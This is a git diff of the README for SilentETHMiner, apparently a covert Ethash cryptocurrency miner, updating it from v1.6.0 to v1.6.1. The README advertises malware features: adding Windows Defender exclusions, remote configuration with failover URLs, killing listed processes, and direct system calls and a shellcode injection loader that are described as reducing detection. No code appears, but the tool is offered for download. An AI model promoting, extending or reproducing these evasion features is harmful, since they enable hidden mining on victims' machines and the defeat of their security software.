@@ -1,7 +1,7 @@
 
 <img src="https://github.com/UnamSanctam/SilentETHMiner/blob/master/SilentETHMiner.png?raw=true">
 
-# SilentETHMiner v1.6.0 - Based on Lime Miner v0.3
+# SilentETHMiner v1.6.1 - Based on Lime Miner v0.3
 
 Can mine any Ethash or Etchash cryptocurrency.
 
@@ -16,7 +16,7 @@ Can mine any Ethash or Etchash cryptocurrency.
 * Ethash/Etchash - Supports mining all Ethash/Etchash coins like Ethereum, Ethereum Classic, Etho, Metaverse, Ellaism, QuarkChain and others
 * Remote Configuration - Can get the miner settings remotely from a URL every 100 minutes
 * Bypass Windows Defender - Adds exclusions into Windows Defender for the general folders the miner uses
-* Online Downloader - Can download the miner binary during runtime to greatly decrease file size and detections
+* Process Killer - Constantly checks for any programs in the "Kill Targets" and kills them if found
 
 ## Downloads
 
@@ -41,6 +41,14 @@ So the requirements are as follow:
 
 ## Changelog
 
+### v1.6.1 (10/10/2021)
+* Added Process Killer feature that constantly checks for the "Kill Targets" programs and kills them if found
+* Added failover capability for the Remote Configuration URL, add several URLs by separating them with a comma (,)
+* Changed system calls to direct system calls thus reducing detections
+* Changed native loader code to reduce detections
+* Removed Online Download feature due to domain being taken down
+* Improved overall code
+* Updated miner
 ### v1.6.0 (02/10/2021)
 **The previous version was supposed to be the last one before the unified miner but I recieved great results by loading everything by Shellcode making it worthwhile to update**
 * Added new Shellcode loader, the miner, watchdog and uninstaller will now be converted into shellcode and injected using a native C loader which greatly reduces detections
